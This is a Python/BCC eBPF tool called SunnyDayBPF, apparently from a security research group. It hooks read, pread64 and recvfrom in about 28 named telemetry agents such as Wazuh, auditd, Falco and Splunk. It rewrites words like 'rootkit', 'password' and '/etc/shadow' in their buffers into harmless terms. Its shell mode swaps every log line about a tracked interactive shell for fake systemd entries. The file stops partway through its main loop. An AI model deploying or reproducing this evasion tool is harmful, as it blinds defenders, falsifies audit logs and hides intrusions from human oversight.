#!/usr/bin/env python3
"""
SunnyDayBPF v2.2 — Universal Post-Syscall Telemetry Redactor
Milenium Security Research | Azizcan Dastan
Post-syscall user-buffer deception across all telemetry pipelines
v2.2: Shell mode — full session invisibility via benign log injection
"""

from bcc import BPF
import sys, signal, ctypes, argparse, os, time, threading, subprocess, pty, select, errno
from datetime import datetime

R  = "\033[31m"
G  = "\033[32m"
Y  = "\033[33m"
C  = "\033[36m"
M  = "\033[35m"
B  = "\033[1m"
DIM = "\033[2m"
RST = "\033[0m"

AGENTS = {
    "wazuh": "Wazuh SIEM",
    "audit": "auditd",
    "audisp": "audisp",
    "osque": "osquery",
    "falco": "Falco",
    "fileb": "Filebeat",
    "fluen": "Fluent-bit/Fluentd",
    "rsysl": "rsyslog",
    "syslo": "syslog-ng",
    "vecto": "Vector",
    "teleg": "Telegraf",
    "promt": "Promtail",
    "datad": "Datadog",
    "splun": "Splunk",
    "ossec": "OSSEC",
    "logst": "Logstash",
    "elast": "Elastic Agent",
    "colle": "collectd",
    "cribl": "Cribl",
    "journ": "journalctl",
    "snort": "Snort",
    "suric": "Suricata",
    "zeek_": "Zeek",
    "beats": "Elastic Beats",
    "metrc": "Metricbeat",
    "packe": "Packetbeat",
    "winlo": "Winlogbeat",
    "hbeat": "Heartbeat",
}

CAT_SECURITY  = 0
CAT_SEVERITY  = 1
CAT_PATH      = 2
CAT_AUTH      = 3
CAT_NETWORK   = 4
CAT_PROCESS   = 5
CAT_CUSTOM    = 6
CAT_SHELL     = 7

CAT_NAMES = {
    CAT_SECURITY: ("SECURITY",  R),
    CAT_SEVERITY: ("SEVERITY",  Y),
    CAT_PATH:     ("PATH",      M),
    CAT_AUTH:     ("AUTH",       C),
    CAT_NETWORK:  ("NETWORK",   G),
    CAT_PROCESS:  ("PROCESS",   B),
    CAT_CUSTOM:   ("CUSTOM",    DIM),
    CAT_SHELL:    ("SHELL",     C),
}

RULES = [
    (b"exploit",      b"nominal",     CAT_SECURITY, True),
    (b"malware",      b"cleaner",     CAT_SECURITY, True),
    (b"backdoor",     b"maindoor",    CAT_SECURITY, True),
    (b"rootkit",      b"toolkit",     CAT_SECURITY, True),
    (b"trojan",       b"module",      CAT_SECURITY, True),
    (b"overflow",     b"dataflow",    CAT_SECURITY, True),
    (b"payload",      b"dataset",     CAT_SECURITY, True),
    (b"shellcode",    b"usercode ",   CAT_SECURITY, True),

    (b"critical",     b"debug   ",    CAT_SEVERITY, True),
    (b"emergency",    b"debug    ",   CAT_SEVERITY, True),
    (b"alert",        b"info ",       CAT_SEVERITY, True),
    (b"warning",      b"notice ",     CAT_SEVERITY, True),
    (b"error",        b"debug",       CAT_SEVERITY, True),

    (b"/etc/shadow",  b"/etc/sunshn", CAT_PATH, False),
    (b"/etc/passwd",  b"/etc/sunshn", CAT_PATH, False),
    (b"/etc/sudoers", b"/etc/sudhelp", CAT_PATH, False),
    (b"/proc/self",   b"/proc/init",  CAT_PATH, False),

    (b"password",     b"SUNNYDAY",    CAT_AUTH, True),
    (b"passwd",       b"sunshn",      CAT_AUTH, True),
    (b"secret",       b"public",      CAT_AUTH, True),
    (b"token=",       b"clean=",      CAT_AUTH, False),
    (b"api_key",      b"app_cfg",     CAT_AUTH, True),

    (b"0.0.0.0",      b"1.2.3.4",    CAT_NETWORK, False),
    (b"reverse",      b"forward",     CAT_NETWORK, True),
    (b"C2",           b"UP",          CAT_NETWORK, False),

    (b"/bin/sh",      b"/bin/ls",     CAT_PROCESS, False),
    (b"/bin/bash",    b"/bin/dash",   CAT_PROCESS, False),
    (b"chmod 777",    b"chmod 644",   CAT_PROCESS, False),
    (b"wget ",        b"curl ",       CAT_PROCESS, False),

    (b"config_change", b"sunny_day    ", CAT_CUSTOM, False),
    (b"milenium",      b"SUNNYDAY",     CAT_CUSTOM, False),
]

SYSCALL_HOOKS = [
    ("enter_read",  "exit_read",  ["ksys_read"],         0, "read",     False),
    ("enter_pread", "exit_pread", ["__x64_sys_pread64"], 1, "pread64",  True),
    ("enter_recv",  "exit_recv",  ["__sys_recvfrom"],    2, "recvfrom", False),
]

SC_NAMES = {0: "READ", 1: "PREAD", 2: "RECV"}

BUF_SIZE = 256
MAX_RULES_PER_GROUP = 4
NUM_CHAIN_SLOTS = 16

# --- Shell mode constants ---
SHELL_PID_MAP_SIZE  = 4096
SHELL_SCAN_LEN      = 200
MAX_BRACKETS        = 8
NUM_SHELL_TEMPLATES = 16
SHELL_REPLACE_SLOT  = 1
CHAIN_OFFSET        = 2
EMIT_EVENT_SLOT     = 12

_TEMPLATE_TEXTS = [
    b"systemd[1]: Starting Daily Cleanup of Temporary Directories.",
    b"systemd[1]: Started Dispatch Password Requests to Console Directory Watch.",
    b"kernel: TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.",
    b"dbus-daemon[1111]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'",
    b"systemd-timesyncd[555]: Synchronized to time server 91.189.91.157:123 (ntp.ubuntu.com).",
    b"systemd[1]: Reached target Timers.",
    b"systemd-resolved[777]: Using degraded feature set UDP instead of TCP for DNS server 8.8.8.8.",
    b"kernel: perf: interrupt took too long (2501 > 2495), lowering kernel.perf_event_max_sample_rate to 50000",
    b"systemd[1]: Starting Rotate log files...",
    b"systemd[1]: Started Daily apt upgrade and clean activities.",
    b"dbus-daemon[1111]: [system] Activating via systemd: service name='org.freedesktop.hostname1'",
    b"systemd-logind[888]: Removed session 3.",
    b"kernel: random: crng init done",
    b"systemd[1]: Starting Update UTMP about System Boot/Shutdown...",
    b"systemd[1]: Started User Manager for UID 1000.",
    b"systemd-journald[333]: Runtime journal is using 8.0M (max allowed 391.4M).",
]

def _pad_template(text, size=256):
    """Pad template text with null bytes to exactly `size` bytes."""
    if len(text) >= size:
        return text[:size]
    return text + b'\x00' * (size - len(text))

SHELL_TEMPLATES = [_pad_template(t, BUF_SIZE) for t in _TEMPLATE_TEXTS]

def _cliteral(byte):
    c = chr(byte)
    if c == "'":  return "'\\''"
    if c == "\\": return "'\\\\'"
    if 32 <= byte < 127: return f"'{c}'"
    return str(byte)


def gen_agent_checks():
    lines = []
    for prefix in AGENTS:
        checks = []
        for i, ch in enumerate(prefix):
            checks.append(f"c[{i}]=='{ch}'")
        lines.append(f"    if ({' && '.join(checks)}) return 1;")
    return "\n".join(lines)


def _split_rules_into_groups():
    groups_by_cat = {}
    for idx, rule in enumerate(RULES):
        groups_by_cat.setdefault(rule[2], []).append((idx, rule))
    split_groups = []
    for cat in sorted(groups_by_cat.keys()):
        cat_rules = groups_by_cat[cat]
        for cs in range(0, len(cat_rules), MAX_RULES_PER_GROUP):
            split_groups.append(cat_rules[cs:cs + MAX_RULES_PER_GROUP])
    return split_groups


def gen_scan_group(func_name, rule_subset, next_chain_idx):
    max_pat = max(len(r[1][0]) for r in rule_subset)
    jumps_per_iter = sum(len(r[1][0]) + 3 for r in rule_subset) + 3
    max_scan = BUF_SIZE - max_pat
    safe_scan = min(max_scan, 7800 // jumps_per_iter)

    blocks = []
    for idx, (pat, rep, cat, ci) in rule_subset:
        plen = len(pat)
        conds = []
        for j, byte in enumerate(pat):
            if ci and chr(byte).isalpha():
                l = ord(chr(byte).lower())
                conds.append(f"((d[i+{j}]|32)=={l})")
            else:
                conds.append(f"d[i+{j}]=={_cliteral(byte)}")
        rep_elems = ", ".join([_cliteral(b) for b in rep])
        blocks.append(
            f"        if ({' && '.join(conds)}) {{\n"
            f"            char _r{idx}[] = {{{rep_elems}}};\n"
            f"            bpf_probe_write_user((void *)(ba+i), _r{idx}, {plen});\n"
            f"            char _v{idx}=0; bpf_probe_read_user(&_v{idx},1,(void*)(ba+i));\n"
            f"            if (_v{idx}==_r{idx}[0]) st->ver_ok++; else st->ver_fail++;\n"
            f"            st->matched |= (1ULL << {idx}); st->last_cat = {cat};\n"
            f"        }}"
        )

    chain_call = f"    chain.call(ctx, {next_chain_idx});" if next_chain_idx is not None else ""

    return f"""
int {func_name}(struct pt_regs *ctx) {{
    u32 zero = 0;
    struct data_t *data = scratch.lookup(&zero);
    if (!data) return 0;
    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    char *d = data->buf;
    u64 ba = st->buf_addr;

    for (int i = 0; i < {safe_scan}; i++) {{
{chr(10).join(blocks)}
    }}
{chain_call}
    return 0;
}}"""


def gen_emit_func(emit_slot=None):
    """Generate emit_event function. emit_slot is used only in shell mode."""
    return f"""
int emit_event(struct pt_regs *ctx) {{
    u32 zero = 0;
    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    if (!st->matched) return 0;

    struct event_t ev = {{}};
    ev.pid = bpf_get_current_pid_tgid() >> 32;
    ev.matched = st->matched;
    ev.ver_ok = st->ver_ok;
    ev.ver_fail = st->ver_fail;
    ev.cat = st->last_cat;
    ev.sc = st->sc;
    bpf_get_current_comm(&ev.comm, sizeof(ev.comm));
    events.perf_submit(ctx, &ev, sizeof(ev));

    u32 ckey = st->last_cat;
    u64 *cnt = stats.lookup(&ckey);
    if (cnt) __sync_fetch_and_add(cnt, 1);
    return 0;
}}"""


def gen_shell_maps():
    """Generate BPF map definitions for shell mode."""
    return f"""
struct shell_state_t {{ u32 active; }};
BPF_HASH(shell_state, u32, struct shell_state_t, 1);

BPF_ARRAY(shell_pid_map, u32, {SHELL_PID_MAP_SIZE});

struct template_t {{ char data[{BUF_SIZE}]; }};
BPF_ARRAY(shell_templates, struct template_t, {NUM_SHELL_TEMPLATES});
"""


def gen_shell_check(shell_pid):
    """Generate loop-free shell_check with unrolled position checks for the hardcoded PID."""
    pid_str = str(shell_pid)
    pid_len = len(pid_str)
    scan_end = SHELL_SCAN_LEN - pid_len

    blocks = []
    for pos in range(0, scan_end, 2):
        byte_conds = " && ".join(f"d[{pos}+{j}]=='{pid_str[j]}'" for j in range(pid_len))
        after_idx = pos + pid_len
        conditions = [byte_conds]

        # Digit boundary: before (skip for pos=0, compiler knows pos==0 at compile time)
        if pos > 0:
            conditions.append(f"(d[{pos}-1]<'0' || d[{pos}-1]>'9')")

        # Digit boundary: after
        conditions.append(f"(d[{after_idx}]<'0' || d[{after_idx}]>'9')")

        all_conds = " && ".join(conditions)
        blocks.append(
            f"    if ({all_conds}) {{\n"
            f"        st->shell_hit = 1;\n"
            f"        chain.call(ctx, {SHELL_REPLACE_SLOT});\n"
            f"        return 0;\n"
            f"    }}"
        )

    return f"""
int shell_check(struct pt_regs *ctx) {{
    u32 zero = 0;
    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    if (!st->shell_active) {{ chain.call(ctx, {CHAIN_OFFSET}); return 0; }}
    struct data_t *data = scratch.lookup(&zero);
    if (!data) return 0;
    char *d = data->buf;

{chr(10).join(blocks)}

    chain.call(ctx, {CHAIN_OFFSET});
    return 0;
}}"""


def gen_shell_replace():
    """Generate shell_replace BPF function — full buffer replacement with benign template."""
    return f"""
int shell_replace(struct pt_regs *ctx) {{
    u32 zero = 0;
    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;

    u32 tidx = bpf_get_prandom_u32() % {NUM_SHELL_TEMPLATES};
    struct template_t *tmpl = shell_templates.lookup(&tidx);
    if (!tmpl) return 0;

    bpf_probe_write_user((void *)st->buf_addr, tmpl->data, {BUF_SIZE});

    char _sv = 0;
    bpf_probe_read_user(&_sv, 1, (void *)st->buf_addr);
    if (_sv == tmpl->data[0]) st->ver_ok++; else st->ver_fail++;

    st->matched |= (1ULL << 31);
    st->last_cat = {CAT_SHELL};

    chain.call(ctx, {EMIT_EVENT_SLOT});
    return 0;
}}"""


def build_bpf_source(shell_mode=False, shell_pid=None):
    split_groups = _split_rules_into_groups()
    num_groups = len(split_groups)

    scan_funcs = []
    if shell_mode:
        pid = shell_pid if shell_pid else 0
        scan_funcs.append(gen_shell_check(pid))
        scan_funcs.append(gen_shell_replace())
    for gi, group in enumerate(split_groups):
        if shell_mode:
            next_idx = gi + CHAIN_OFFSET + 1 if gi < num_groups - 1 else EMIT_EVENT_SLOT
        else:
            next_idx = gi + 1 if gi < num_groups - 1 else num_groups
        scan_funcs.append(gen_scan_group(f"scan_g{gi}", group, next_idx))
    scan_funcs.append(gen_emit_func())

    shell_defs = gen_shell_maps() if shell_mode else ""

    enter_exit_funcs = []
    for enter_fn, exit_fn, _, sc_idx, _, nested in SYSCALL_HOOKS:
        if nested:
            buf_extract = (
                "    u64 __regs_addr = PT_REGS_PARM1(ctx);\n"
                "    u64 bp = 0;\n"
                "    bpf_probe_read_kernel(&bp, sizeof(bp), (void *)(__regs_addr + 104));\n"
                "    if (!bp) return 0;"
            )
        else:
            buf_extract = "    u64 bp = PT_REGS_PARM2(ctx);"

        if shell_mode:
            shell_active_init = (
                "    struct shell_state_t *ss = shell_state.lookup(&zero);\n"
                "    u8 _sa = (ss && ss->active) ? 1 : 0;\n"
                "    st->shell_active = _sa;"
            )
        else:
            shell_active_init = "    st->shell_active = 0;"

        enter_exit_funcs.append(f"""
int {enter_fn}(struct pt_regs *ctx) {{
    if (!is_target()) return 0;
    u64 id = bpf_get_current_pid_tgid();
{buf_extract}
    buf_ptrs.update(&id, &bp);
    return 0;
}}

int {exit_fn}(struct pt_regs *ctx) {{
    u64 id = bpf_get_current_pid_tgid();
    u64 *bp = buf_ptrs.lookup(&id);
    if (!bp) return 0;
    int ret = PT_REGS_RC(ctx);
    buf_ptrs.delete(&id);
    if (ret <= 4) return 0;

    u32 zero = 0;
    struct data_t *data = scratch.lookup(&zero);
    if (!data) return 0;
    if (bpf_probe_read_user(&data->buf, sizeof(data->buf), (void *)*bp) < 0) return 0;

    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    st->buf_addr = *bp;
    st->matched = 0;
    st->ver_ok = 0;
    st->ver_fail = 0;
    st->last_cat = 0;
    st->sc = {sc_idx};
    st->shell_hit = 0;
{shell_active_init}

    chain.call(ctx, 0);
    return 0;
}}""")

    return f"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

struct data_t {{ char buf[{BUF_SIZE}]; }};

struct scan_state_t {{
    u64 buf_addr;
    u64 matched;
    u16 ver_ok;
    u16 ver_fail;
    u8  last_cat;
    u8  sc;
    u8  shell_active;
    u8  shell_hit;
}};

struct event_t {{
    u32 pid;
    u64 matched;
    u16 ver_ok;
    u16 ver_fail;
    u8  cat;
    u8  sc;
    char comm[16];
}};

BPF_HASH(buf_ptrs, u64, u64);
BPF_PERCPU_ARRAY(scratch, struct data_t, 1);
BPF_PERCPU_ARRAY(scan_state, struct scan_state_t, 1);
BPF_PROG_ARRAY(chain, {NUM_CHAIN_SLOTS});
BPF_PERF_OUTPUT(events);
BPF_ARRAY(stats, u64, 8);
{shell_defs}
static __always_inline int is_target() {{
    char c[16];
    bpf_get_current_comm(&c, sizeof(c));
{gen_agent_checks()}
    return 0;
}}

{''.join(enter_exit_funcs)}
{''.join(scan_funcs)}
"""


class Event(ctypes.Structure):
    _fields_ = [
        ("pid",      ctypes.c_uint32),
        ("matched",  ctypes.c_uint64),
        ("ver_ok",   ctypes.c_uint16),
        ("ver_fail", ctypes.c_uint16),
        ("cat",      ctypes.c_uint8),
        ("sc",       ctypes.c_uint8),
        ("comm",     ctypes.c_char * 16),
    ]

total_hits = 0
total_verified = 0
total_failed = 0
cat_hits = {i: 0 for i in range(8)}


def handle_event(cpu, data, size):
    global total_hits, total_verified, total_failed
    ev = ctypes.cast(data, ctypes.POINTER(Event)).contents
    now = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    comm = ev.comm.decode(errors="replace").rstrip("\x00")
    sc = SC_NAMES.get(ev.sc, "???")

    matched_rules = []
    for i in range(len(RULES)):
        if ev.matched & (1 << i):
            matched_rules.append(i)

    shell_hit = bool(ev.matched & (1 << 31))
    matched_cats = set(RULES[ri][2] for ri in matched_rules)
    if shell_hit or ev.cat == CAT_SHELL:
        matched_cats.add(CAT_SHELL)

    cats_str = ",".join(CAT_NAMES[c][0].strip() for c in sorted(matched_cats))
    cat_color = CAT_NAMES.get(min(matched_cats), ("???", DIM))[1] if matched_cats else DIM
    ver_sym = f"{G}V{RST}" if ev.ver_fail == 0 else f"{R}X {ev.ver_fail} fail{RST}"

    total_hits += len(matched_rules) + (1 if shell_hit else 0)
    total_verified += ev.ver_ok
    total_failed += ev.ver_fail

    for ri in matched_rules:
        rc = RULES[ri][2]
        cat_hits[rc] = cat_hits.get(rc, 0) + 1
    if shell_hit or ev.cat == CAT_SHELL:
        cat_hits[CAT_SHELL] = cat_hits.get(CAT_SHELL, 0) + 1

    patterns_str = ""
    if shell_hit or ev.cat == CAT_SHELL:
        patterns_str = f' {C}*SHELL BUFFER REPLACED*{RST}'
    else:
        for ri in matched_rules[:4]:
            pat, rep = RULES[ri][0], RULES[ri][1]
            patterns_str += f' {DIM}"{pat.decode()}" -> "{rep.decode()}"{RST}'

    print(
        f"  {DIM}{now}{RST}  "
        f"PID:{Y}{ev.pid:<6}{RST} "
        f"{C}{comm:16}{RST} "
        f"{B}{sc:8}{RST} "
        f"[{cat_color}{cats_str:16}{RST}] "
        f"{ver_sym} "
        f"{patterns_str}"
    )


def load_chain(b, split_groups, shell_mode=False):
    """Load BPF functions into tail-call chain."""
    chain = b.get_table("chain")
    num_groups = len(split_groups)

    if shell_mode:
        fn_shell_check = b.load_func("shell_check", BPF.KPROBE)
        chain[ctypes.c_int(0)] = ctypes.c_int(fn_shell_check.fd)
        fn_shell_replace = b.load_func("shell_replace", BPF.KPROBE)
        chain[ctypes.c_int(1)] = ctypes.c_int(fn_shell_replace.fd)

        for gi in range(num_groups):
            fn = b.load_func(f"scan_g{gi}", BPF.KPROBE)
            chain[ctypes.c_int(gi + CHAIN_OFFSET)] = ctypes.c_int(fn.fd)

        fn_emit = b.load_func("emit_event", BPF.KPROBE)
        chain[ctypes.c_int(EMIT_EVENT_SLOT)] = ctypes.c_int(fn_emit.fd)
    else:
        for gi in range(num_groups):
            fn = b.load_func(f"scan_g{gi}", BPF.KPROBE)
            chain[ctypes.c_int(gi)] = ctypes.c_int(fn.fd)
        fn_emit = b.load_func("emit_event", BPF.KPROBE)
        chain[ctypes.c_int(num_groups)] = ctypes.c_int(fn_emit.fd)


class ShellModeManager:
    """Manages interactive shell, PID tracking, and BPF map updates for shell mode."""

    def __init__(self, bpf_module, shell_path="/bin/bash", shell_process=None, shell_pty_fd=None, shell_pid=None):
        self.bpf = bpf_module
        self.shell_path = shell_path
        self.shell_pid = shell_pid
        self._process = shell_process
        self._pty_fd = shell_pty_fd
        self.tracked_pids = set()
        self._running = False
        self._updater_thread = None

    def start(self):
        """Initialize BPF maps, register shell PID, start PID tracker."""
        self._populate_templates()
        self._set_shell_state(1)
        if self.shell_pid:
            self.tracked_pids.add(self.shell_pid)
            self._add_pid(self.shell_pid)
        self._running = True
        self._updater_thread = threading.Thread(target=self._update_pids_loop, daemon=True)
        self._updater_thread.start()
        return self._pty_fd

    def stop(self):
        """Terminate shell and clean up."""
        self._running = False
        if self._updater_thread:
            self._updater_thread.join(timeout=2.0)
        if self._process and self._process.poll() is None:
            try:
                os.killpg(os.getpgid(self._process.pid), signal.SIGTERM)
                self._process.wait(timeout=3.0)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                try:
                    os.killpg(os.getpgid(self._process.pid), signal.SIGKILL)
                except ProcessLookupError:
                    pass
        self._set_shell_state(0)
        self._clear_tracked_pids()
        if self._pty_fd:
            try:
                os.close(self._pty_fd)
            except OSError:
                pass

    def _populate_templates(self):
        """Write benign log templates into shell_templates BPF array."""
        try:
            tmpl_map = self.bpf.get_table("shell_templates")
            for i, tpl in enumerate(SHELL_TEMPLATES):
                buf = ctypes.create_string_buffer(tpl, BUF_SIZE)
                tmpl_map[ctypes.c_int(i)] = buf
        except Exception as e:
            print(f"  {Y}[!] Template init warning: {e}{RST}")

    def _set_shell_state(self, active):
        """Enable or disable shell mode in BPF."""
        try:
            ss_map = self.bpf.get_table("shell_state")
            zero = ctypes.c_uint32(0)
            val = ctypes.c_uint32(active)
            ss_map[zero] = val
        except Exception:
            pass

    def _add_pid(self, pid):
        """Add a PID to the shell_pid_map."""
        try:
            idx = ctypes.c_uint32(pid % SHELL_PID_MAP_SIZE)
            pmap = self.bpf.get_table("shell_pid_map")
            pmap[idx] = ctypes.c_uint32(1)
        except Exception:
            pass

    def _remove_pid(self, pid):
        """Remove a PID from shell_pid_map."""
        try:
            idx = ctypes.c_uint32(pid % SHELL_PID_MAP_SIZE)
            pmap = self.bpf.get_table("shell_pid_map")
            pmap[idx] = ctypes.c_uint32(0)
        except Exception:
            pass

    def _clear_tracked_pids(self):
        """Clear all tracked PIDs from BPF map."""
        try:
            pmap = self.bpf.get_table("shell_pid_map")
            for pid in self.tracked_pids:
                idx = ctypes.c_uint32(pid % SHELL_PID_MAP_SIZE)
                pmap[idx] = ctypes.c_uint32(0)
        except Exception:
            pass

    def _discover_descendants(self):
        """Scan /proc to find all descendants of the shell process."""
        if not self.shell_pid:
            return set()
        current = set()
        try:
            for entry in os.listdir("/proc"):
                if not entry.isdigit():
                    continue
                pid = int(entry)
                if pid in current or pid == self.shell_pid:
                    continue
                try:
                    with open(f"/proc/{pid}/status") as f:
                        for line in f:
                            if line.startswith("PPid:"):
                                ppid = int(line.split()[1])
                                if ppid in self.tracked_pids or ppid == self.shell_pid:
                                    current.add(pid)
                                break
                except (IOError, ValueError, OSError):
                    continue
        except PermissionError:
            pass
        current.add(self.shell_pid)
        return current

    def _update_pids_loop(self):
        """Background thread: poll /proc to refresh tracked PIDs."""
        while self._running:
            time.sleep(0.5)
            try:
                current = self._discover_descendants()
                for pid in (self.tracked_pids - current):
                    self._remove_pid(pid)
                for pid in (current - self.tracked_pids):
                    self._add_pid(pid)
                self.tracked_pids = current
            except Exception:
                pass

def print_banner():
    print(f"""
{B}{C}+=====================================================================+
|  SunnyDayBPF v2.2 -- Universal Post-Syscall Telemetry Redactor      |
|  Milenium Security Research | Azizcan Dastan                        |
|  v2.2: Shell mode -- full session invisibility                      |
+====================================================================={RST}
""")


def print_config(shell_mode=False, shell_path=None):
    print(f"  {B}Hedef Agentlar:{RST} {len(AGENTS)} telemetry agent")
    agents_line = ", ".join(list(AGENTS.values())[:8])
    print(f"  {DIM}{agents_line} ...{RST}")
    print()
    print(f"  {B}Redaction Kurallari:{RST} {len(RULES)} aktif kural")
    for cat_id, (cat_name, cat_color) in CAT_NAMES.items():
        count = sum(1 for r in RULES if r[2] == cat_id)
        if count:
            print(f"    [{cat_color}{cat_name:8}{RST}] {count} kural")
    print()

    split_groups = _split_rules_into_groups()
    print(f"  {B}Scan Gruplari:{RST} {len(split_groups)} tail-call group")
    for gi, group in enumerate(split_groups):
        max_pat = max(len(r[1][0]) for r in group)
        jumps = sum(len(r[1][0]) + 3 for r in group) + 3
        scan = min(BUF_SIZE - max_pat, 7800 // jumps)
        cat = group[0][1][2]
        cat_name = CAT_NAMES[cat][0]
        cat_color = CAT_NAMES[cat][1]
        pats = ", ".join(r[1][0].decode() for r in group)
        print(f"    g{gi} [{cat_color}{cat_name:8}{RST}] scan={G}{scan:3}{RST}/{BUF_SIZE}  {DIM}{pats}{RST}")
    print()

    print(f"  {B}Syscall Hook:{RST} {len(SYSCALL_HOOKS)} hook tanimli")
    for _, _, variants, _, desc, nested in SYSCALL_HOOKS:
        extra = " [nested-regs]" if nested else ""
        print(f"    {desc} -> {', '.join(variants)}{extra}")
    print(f"  {B}Buffer:{RST} {BUF_SIZE} byte")
    print(f"  {B}Dogrulama:{RST} read-back verification aktif")
    print()

    if shell_mode:
        print(f"  {B}{C}=== SHELL MODE ==={RST}")
        print(f"  {B}Shell:{RST} {shell_path}")
        print(f"  {B}PID Map:{RST} {SHELL_PID_MAP_SIZE} slot (modulo)")
        print(f"  {B}Scan:{RST} ilk {SHELL_SCAN_LEN} byte, max {MAX_BRACKETS} bracket")
        print(f"  {B}Templates:{RST} {NUM_SHELL_TEMPLATES} benign log")
        print(f"  {B}Chain:{RST} slot 0=shell_check, 1=shell_replace, 2-11=g0-g9, 12=emit")
        print(f"  {C}  Shell'deki tum process'lerin PID'leri track edilir.{RST}")
        print(f"  {C}  Telemetri agent'i tracked PID gorurse -> buffer benign log ile degistirilir.{RST}")
        print()


def print_stats():
    print(f"\n{B}{C}=== ISTATISTIKLER ==={RST}")
    print(f"  Toplam hit:        {Y}{total_hits}{RST}")
    print(f"  Dogrulanmis:       {G}{total_verified}{RST}")
    print(f"  Basarisiz:         {R}{total_failed}{RST}")
    if total_hits > 0:
        rate = (total_verified / (total_verified + total_failed)) * 100 if (total_verified + total_failed) > 0 else 0
        print(f"  Dogrulama orani:   {G if rate > 90 else Y}{rate:.1f}%{RST}")
    print()
    for cat_id, (cat_name, cat_color) in CAT_NAMES.items():
        if cat_hits.get(cat_id, 0) > 0:
            print(f"    [{cat_color}{cat_name:8}{RST}] {cat_hits[cat_id]} hit")
    print()


def main():
    parser = argparse.ArgumentParser(description="SunnyDayBPF v2.2 -- Universal Telemetry Redactor")
    parser.add_argument("--dump-bpf", action="store_true", help="BPF C kodunu yazdir ve cik")
    parser.add_argument("--list-rules", action="store_true", help="Tum kurallari listele")
    parser.add_argument("--list-agents", action="store_true", help="Hedef agentlari listele")
    parser.add_argument("--shell", nargs="?", const="/bin/bash", metavar="PATH",
                        help="Shell modu: interaktif shell baslat ve telemetri loglarini maskele "
                             "(varsayilan: /bin/bash)")
    args = parser.parse_args()

    if args.list_rules:
        print(f"\n{B}Redaction Kurallari ({len(RULES)} kural):{RST}\n")
        for i, (pat, rep, cat, ci) in enumerate(RULES):
            cat_name, cat_color = CAT_NAMES.get(cat, ("???", DIM))
            ci_flag = " [ci]" if ci else ""
            print(f"  {DIM}{i:2}{RST}  [{cat_color}{cat_name:8}{RST}]  "
                  f'"{pat.decode()}" -> "{rep.decode()}"{ci_flag}')
        print()
        return

    if args.list_agents:
        print(f"\n{B}Hedef Agentlar ({len(AGENTS)} agent):{RST}\n")
        for prefix, name in AGENTS.items():
            print(f"  {C}{prefix}*{RST}  ->  {name}")
        print()
        return

    shell_mode = args.shell is not None
    shell_path = args.shell if shell_mode else None

    shell_process = None
    shell_pty_fd = None
    shell_pid = None

    if shell_mode and not args.dump_bpf:
        # Spawn shell first to get PID for hardcoded BPF scan
        print_banner()
        print(f"  {Y}[*] Shell baslatiliyor, PID aliniyor...{RST}")
        master_fd, slave_fd = pty.openpty()
        shell_process = subprocess.Popen(
            [shell_path],
            stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
            preexec_fn=os.setsid,
            env=dict(os.environ, TERM=os.environ.get("TERM", "xterm-256color")),
        )
        os.close(slave_fd)
        shell_pty_fd = master_fd
        shell_pid = shell_process.pid
        print(f"  {G}[+] Shell PID: {shell_pid}{RST}")

    src = build_bpf_source(shell_mode=shell_mode, shell_pid=shell_pid)

    if args.dump_bpf:
        print(src)
        return

    print_banner()
    print_config(shell_mode=shell_mode, shell_path=shell_path)

    for i, (pat, rep, cat, ci) in enumerate(RULES):
        if len(pat) != len(rep):
            print(f"{R}[!] HATA: Kural {i} uzunluk uyumsuz: {pat!r}({len(pat)}) vs {rep!r}({len(rep)}){RST}")
            sys.exit(1)

    split_groups = _split_rules_into_groups()
    num_groups = len(split_groups)

    mode_label = "shell" if shell_mode else "normal"
    total_chains = 2 + num_groups + 1 if shell_mode else num_groups + 1
    print(f"  {Y}[*] BPF programi derleniyor ({mode_label} mod, {total_chains} chain)...{RST}")
    try:
        b = BPF(text=src)
    except Exception as e:
        print(f"{R}[!] BPF derleme hatasi:{RST}\n{e}")
        sys.exit(1)

    load_chain(b, split_groups, shell_mode=shell_mode)

    attached = []
    failed = []
    for enter_fn, exit_fn, variants, sc_idx, desc, _ in SYSCALL_HOOKS:
        ok = False
        for func_name in variants:
            try:
                b.attach_kprobe(event=func_name, fn_name=enter_fn)
                b.attach_kretprobe(event=func_name, fn_name=exit_fn)
                attached.append((desc, func_name))
                ok = True
                break
            except Exception as e:
                continue
        if not ok:
            failed.append((desc, variants))

    for desc, func_name in attached:
        print(f"  {G}[+] {desc} -> {func_name}{RST}")
    for desc, variants in failed:
        print(f"  {R}[!] {desc} BASARISIZ -> {variants}{RST}")

    status = "SHELL" if shell_mode else "NORMAL"
    print(f"  {G}[+] VERIFIER PASSED -- {len(RULES)} kural, {len(attached)} syscall hook, {total_chains} chain [{status} MODE]{RST}")

    shell_mgr = None
    if shell_mode:
        print()
        print(f"  {C}{B}>>> SHELL AKTIF: {shell_path}{RST}")
        print(f"  {DIM}    Shell PID: {shell_pid}  |  Shell'deki her sey telemetride gorunmez.{RST}")
        print(f"  {DIM}    Cikmak icin: exit veya Ctrl+D{RST}")
        print()
        shell_mgr = ShellModeManager(b, shell_path, shell_process, shell_pty_fd, shell_pid)
        shell_mgr.start()
        pty_fd = shell_pty_fd
        print(f"  {G}[+] PID tracker aktif (500ms polling){RST}")

    print()
    print(f"  {DIM}{'=' * 75}{RST}")
    print(f"  {B}ZAMAN        PID     AGENT            SYSCALL  KATEGORI         VER{RST}")
    print(f"  {DIM}{'=' * 75}{RST}")

    b["events"].open_perf_buffer(handle_event, page_cnt=64)

    running = True
    def cleanup(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    if shell_mode and shell_mgr:
        # PTY relay in main thread, BPF events polled alongside
        import termios, tty
        fd_in = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd_in)
        try:
            tty.setraw(fd_in, termios.TCSANOW)
            while running and shell_mgr._process.poll() is None:
                r, _, _ = select.select([fd_in, pty_fd], [], [], 0.1)
                if fd_in in r:
                    data = os.read(fd_in, 4096)
                    if not data:
                        break
